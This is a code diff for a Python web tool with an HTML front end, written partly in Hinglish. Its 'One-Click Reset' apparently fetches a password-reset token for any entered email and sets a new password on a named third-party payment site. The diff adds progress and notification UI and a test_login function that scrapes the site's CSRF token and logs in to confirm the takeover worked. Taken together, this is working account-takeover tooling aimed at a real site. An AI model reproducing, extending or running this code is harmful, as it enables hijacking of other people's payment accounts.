@@ -18,6 +18,7 @@ HTML = r"""<!DOCTYPE html>
       --ok-bg: #dcfce7; --ok-text: #166534; --ok-border: #bbf7d0;
       --err-bg: #fee2e2; --err-text: #991b1b; --err-border: #fecaca;
       --note-bg: #f8fafc; --input-bg: #ffffff; --filled-bg: #f0fdf4;
+      --toast-bg: #0f172a; --toast-text: #f8fafc;
     }
     [data-theme="dark"] {
       --primary: #3b82f6; --primary-hover: #60a5fa;
@@ -26,6 +27,7 @@ HTML = r"""<!DOCTYPE html>
       --ok-bg: #14532d; --ok-text: #bbf7d0; --ok-border: #166534;
       --err-bg: #7f1d1d; --err-text: #fecaca; --err-border: #991b1b;
       --note-bg: #0f172a; --input-bg: #0f172a; --filled-bg: #14532d;
+      --toast-bg: #f1f5f9; --toast-text: #0f172a;
     }
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
@@ -79,6 +81,8 @@ HTML = r"""<!DOCTYPE html>
       background: transparent; color: var(--muted); border: 1px dashed var(--border);
     }
     button.ghost:hover { color: var(--text); border-style: solid; }
+    button.success-btn { background: #16a34a; margin-top: .6rem; }
+    button.success-btn:hover { background: #15803d; }
     #advanced { display: none; margin-top: .5rem; }
     #advanced.open { display: block; }
     #result {
@@ -101,9 +105,62 @@ HTML = r"""<!DOCTYPE html>
     }
     .steps span.active { color: var(--primary); border-color: var(--primary); font-weight: 600; }
     .steps span.done { color: #22c55e; border-color: #22c55e; }
+
+    /* Progress bar */
+    .progress-wrap {
+      display: none; margin-top: 1rem;
+    }
+    .progress-wrap.show { display: block; }
+    .progress-label {
+      font-size: .8rem; color: var(--muted); margin-bottom: .4rem;
+      display: flex; justify-content: space-between;
+    }
+    .progress-track {
+      height: 8px; background: var(--border); border-radius: 99px; overflow: hidden;
+    }
+    .progress-fill {
+      height: 100%; width: 0%; background: var(--primary);
+      border-radius: 99px; transition: width .35s ease;
+    }
+    .progress-fill.indeterminate {
+      width: 40% !important;
+      animation: slide 1.2s ease-in-out infinite;
+    }
+    @keyframes slide {
+      0% { transform: translateX(-100%); }
+      100% { transform: translateX(280%); }
+    }
+
+    /* Toast */
+    #toasts {
+      position: fixed; top: 1rem; right: 1rem; z-index: 9999;
+      display: flex; flex-direction: column; gap: .5rem; max-width: min(360px, 92vw);
+      pointer-events: none;
+    }
+    .toast {
+      pointer-events: auto;
+      background: var(--toast-bg); color: var(--toast-text);
+      padding: .85rem 1rem; border-radius: 12px;
+      font-size: .875rem; line-height: 1.4;
+      box-shadow: 0 10px 30px rgba(0,0,0,.25);
+      animation: toastIn .25s ease;
+      border-left: 4px solid var(--primary);
+    }
+    .toast.ok { border-left-color: #22c55e; }
+    .toast.err { border-left-color: #ef4444; }
+    .toast.hide { animation: toastOut .25s ease forwards; }
+    @keyframes toastIn {
+      from { opacity: 0; transform: translateY(-8px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes toastOut {
+      to { opacity: 0; transform: translateY(-8px); }
+    }
   </style>
 </head>
 <body>
+  <div id="toasts"></div>
+
   <div class="card">
     <div class="top">
       <div>
@@ -125,7 +182,19 @@ HTML = r"""<!DOCTYPE html>
     <label for="password">New Password</label>
     <input id="password" type="password" placeholder="Naya password (min 6)" autocomplete="new-password">
 
+    <div class="progress-wrap" id="progressWrap">
+      <div class="progress-label">
+        <span id="progressText">Working...</span>
+        <span id="progressPct">0%</span>
+      </div>
+      <div class="progress-track">
+        <div class="progress-fill" id="progressFill"></div>
+      </div>
+    </div>
+
     <button class="full" id="oneClickBtn">One-Click Reset</button>
+    <button class="full success-btn" id="testLoginBtn" style="display:none">Test Login</button>
+
     <button type="button" class="ghost" id="toggleAdv">Advanced: manual token ▾</button>
 
     <div id="advanced">
@@ -140,13 +209,15 @@ HTML = r"""<!DOCTYPE html>
     <div id="result"></div>
 
     <div class="note">
-      <b>One-Click:</b> Sirf email + naya password dalo → button dabao.<br>
-      Token automatic nikal ke reset ho jayega (10–25 sec lag sakte hain).
+      <b>One-Click:</b> Email + password → auto token + reset.<br>
+      Success ke baad <b>Test Login</b> se verify kar sakte ho.
     </div>
   </div>
+
   <script>
     const $ = id => document.getElementById(id);
     const result = $('result');
+    let lastPassword = '';
 
     // Theme
     (function initTheme() {
@@ -162,10 +233,44 @@ HTML = r"""<!DOCTYPE html>
       $('themeBtn').textContent = next === 'dark' ? '☀️' : '🌙';
     };
 
+    // Toast
+    function toast(msg, ok) {
+      const el = document.createElement('div');
+      el.className = 'toast ' + (ok ? 'ok' : 'err');
+      el.textContent = msg;
+      $('toasts').appendChild(el);
+      setTimeout(() => {
+        el.classList.add('hide');
+        setTimeout(() => el.remove(), 250);
+      }, 3500);
+    }
+
     function show(msg, ok) {
       result.style.display = 'block';
       result.className = ok ? 'ok' : 'err';
       result.textContent = msg;
+      toast(msg.length > 80 ? msg.slice(0, 80) + '…' : msg, ok);
+    }
+
+    // Progress
+    function progressShow(text, pct, indeterminate) {
+      const wrap = $('progressWrap');
+      const fill = $('progressFill');
+      wrap.classList.add('show');
+      $('progressText').textContent = text;
+      if (indeterminate) {
+        fill.classList.add('indeterminate');
+        $('progressPct').textContent = '';
+      } else {
+        fill.classList.remove('indeterminate');
+        fill.style.width = Math.max(0, Math.min(100, pct)) + '%';
+        $('progressPct').textContent = Math.round(pct) + '%';
+      }
+    }
+    function progressHide() {
+      $('progressWrap').classList.remove('show');
+      $('progressFill').classList.remove('indeterminate');
+      $('progressFill').style.width = '0%';
     }
 
     function setStep(n) {
@@ -185,7 +290,7 @@ HTML = r"""<!DOCTYPE html>
 
     async function api(body) {
       const controller = new AbortController();
-      const timer = setTimeout(() => controller.abort(), 40000);
+      const timer = setTimeout(() => controller.abort(), 45000);
       try {
         const res = await fetch('/', {
           method: 'POST',
@@ -199,27 +304,36 @@ HTML = r"""<!DOCTYPE html>
       }
     }
 
+    function setBusy(busy) {
+      ['oneClickBtn','findBtn','manualBtn','testLoginBtn'].forEach(id => {
+        const el = $(id);
+        if (el) el.disabled = busy;
+      });
+    }
+
     async function findTokenOnly() {
       const email = $('email').value.trim();
       if (!email) return show('Pehle email dalo', false);
-      const btn = $('findBtn');
-      btn.disabled = true;
-      btn.textContent = '...';
+      setBusy(true);
       setStep(2);
+      progressShow('Token dhoondh rahe hain...', 30, true);
       try {
         const data = await api({ action: 'find_token', email });
+        progressShow('Token check...', 90, false);
         if (data.success && data.token) {
           $('token').value = data.token;
           $('token').classList.add('filled');
-          show('Token mil gaya. Ab Reset with Token dabao ya password set karke One-Click use karo.', true);
+          progressShow('Token mil gaya', 100, false);
+          show('Token mil gaya. Ab password set karke reset karo.', true);
         } else {
           show(data.message || 'Token nahi mila', false);
         }
       } catch (e) {
         show(e.name === 'AbortError' ? 'Timeout. Dobara try karo.' : ('Error: ' + e.message), false);
       }
-      btn.disabled = false;
-      btn.textContent = 'Find';
+      setTimeout(progressHide, 600);
+      setBusy(false);
+      $('findBtn').textContent = 'Find';
     }
 
     async function resetWithToken() {
@@ -228,63 +342,83 @@ HTML = r"""<!DOCTYPE html>
       const password = $('password').value.trim();
       if (!email || !token || !password) return show('Email, Token, Password required', false);
       if (password.length < 6) return show('Password min 6 characters', false);
-      const btn = $('manualBtn');
-      btn.disabled = true;
-      btn.textContent = 'Processing...';
+      setBusy(true);
+      progressShow('Password reset ho raha hai...', 50, true);
       try {
         const data = await api({ action: 'reset', email, token, password });
-        if (data.success) setStep(3);
+        progressShow(data.success ? 'Done' : 'Failed', 100, false);
+        if (data.success) {
+          setStep(3);
+          lastPassword = password;
+          $('testLoginBtn').style.display = 'block';
+        }
         show(data.message, !!data.success);
       } catch (e) {
         show('Error: ' + e.message, false);
       }
-      btn.disabled = false;
-      btn.textContent = 'Reset with Token';
+      setTimeout(progressHide, 600);
+      setBusy(false);
     }
 
     async function oneClick() {
       const email = $('email').value.trim();
       const password = $('password').value.trim();
-      const btn = $('oneClickBtn');
 
       if (!email || !password) return show('Email aur New Password dono dalo', false);
       if (password.length < 6) return show('Password min 6 characters', false);
 
-      btn.disabled = true;
-      $('findBtn').disabled = true;
-      $('manualBtn').disabled = true;
+      setBusy(true);
       result.style.display = 'none';
+      $('testLoginBtn').style.display = 'none';
 
       try {
-        // Step 1: find token
         setStep(2);
-        btn.textContent = 'Finding token...';
+        progressShow('1/2 Token dhoondh rahe hain...', 15, false);
         const found = await api({ action: 'find_token', email });
         if (!found.success || !found.token) {
+          progressShow('Token fail', 100, false);
           show(found.message || 'Token nahi mila', false);
           return;
         }
         $('token').value = found.token;
         $('token').classList.add('filled');
+        progressShow('2/2 Password reset ho raha hai...', 55, false);
 
-        // Step 2: reset
-        btn.textContent = 'Resetting password...';
         const done = await api({
-          action: 'reset',
-          email,
-          token: found.token,
-          password
+          action: 'reset', email, token: found.token, password
         });
-        if (done.success) setStep(3);
+        progressShow(done.success ? 'Complete!' : 'Failed', 100, false);
+        if (done.success) {
+          setStep(3);
+          lastPassword = password;
+          $('testLoginBtn').style.display = 'block';
+        }
         show(done.message, !!done.success);
       } catch (e) {
         show(e.name === 'AbortError' ? 'Timeout (server slow). Dobara try karo.' : ('Error: ' + e.message), false);
       } finally {
-        btn.disabled = false;
-        btn.textContent = 'One-Click Reset';
-        $('findBtn').disabled = false;
-        $('manualBtn').disabled = false;
+        setTimeout(progressHide, 800);
+        setBusy(false);
+        $('oneClickBtn').textContent = 'One-Click Reset';
       }
+    }
+
+    async function testLogin() {
+      const email = $('email').value.trim();
+      const password = $('password').value.trim() || lastPassword;
+      if (!email || !password) return show('Email aur password chahiye login test ke liye', false);
+
+      setBusy(true);
+      progressShow('Login test ho raha hai...', 40, true);
+      try {
+        const data = await api({ action: 'test_login', email, password });
+        progressShow(data.success ? 'Login OK' : 'Login fail', 100, false);
+        show(data.message, !!data.success);
+      } catch (e) {
+        show('Error: ' + e.message, false);
+      }
+      setTimeout(progressHide, 600);
+      setBusy(false);
     }
 
     setStep(1);
@@ -292,6 +426,7 @@ HTML = r"""<!DOCTYPE html>
     $('findBtn').onclick = findTokenOnly;
     $('manualBtn').onclick = resetWithToken;
     $('oneClickBtn').onclick = oneClick;
+    $('testLoginBtn').onclick = testLogin;
     document.addEventListener('keydown', e => {
       if (e.key === 'Enter') oneClick();
     });
@@ -403,7 +538,7 @@ def reset_password(email: str, token: str, password: str):
         success = False
 
     if success:
-        message = "Password reset successful! Ab naye password se login karo."
+        message = "Password reset successful! Ab Test Login se verify karo."
     elif "can't find a user" in text_lower:
         message = "Is email se koi account nahi mila."
     elif "token" in text_lower and ("invalid" in text_lower or "expired" in text_lower):
@@ -416,6 +551,62 @@ def reset_password(email: str, token: str, password: str):
         "message": message,
         "status_code": post_resp.status_code,
         "final_url": post_resp.url,
+    }
+
+
+def test_login(email: str, password: str):
+    BASE_URL = "https://payment.vaccdharampur.org"
+    session = requests.Session()
+    session.headers.update({
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    })
+
+    r = session.get(f"{BASE_URL}/login", timeout=15)
+    if r.status_code != 200:
+        return {"success": False, "message": f"Login page open nahi hua ({r.status_code})"}
+
+    m = re.search(r'name="_token"\s+value="([^"]+)"', r.text)
+    if not m:
+        return {"success": False, "message": "Login CSRF nahi mila"}
+    csrf = m.group(1)
+
+    post = session.post(
+        f"{BASE_URL}/login",
+        data={"_token": csrf, "email": email, "password": password},
+        headers={"Referer": f"{BASE_URL}/login", "Origin": BASE_URL},
+        allow_redirects=True,
+        timeout=15,
+    )
+
+    final_url = post.url.lower().rstrip("/")
+    text_lower = post.text.lower()
+
+    success = (
+        final_url.endswith("/home")
+        or "/home" in final_url
+        or final_url.endswith("/dashboard")
+        or "/dashboard" in final_url
+    )
+
+    # Still on login page with error
+    if "/login" in final_url and (
+        "credentials" in text_lower
+        or "invalid" in text_lower
+        or "incorrect" in text_lower
+        or "these credentials do not match" in text_lower
+    ):
+        success = False
+
+    if success:
+        message = "Login successful! Password sahi set hai."
+    else:
+        message = "Login fail. Password galat ho sakta hai ya account lock."
+
+    return {
+        "success": success,
+        "message": message,
+        "final_url": post.url,
+        "status_code": post.status_code,
     }
 
 
@@ -445,6 +636,12 @@ class handler(BaseHTTPRequestHandler):
                 if not email:
                     return self._json(400, {"success": False, "message": "Email required"})
                 return self._json(200, find_token(email))
+
+            if action == "test_login":
+                password = (data.get("password") or "").strip()
+                if not email or not password:
+                    return self._json(400, {"success": False, "message": "Email aur password required"})
+                return self._json(200, test_login(email, password))
 
             token = (data.get("token") or "").strip()
             password = (data.get("password") or "").strip()
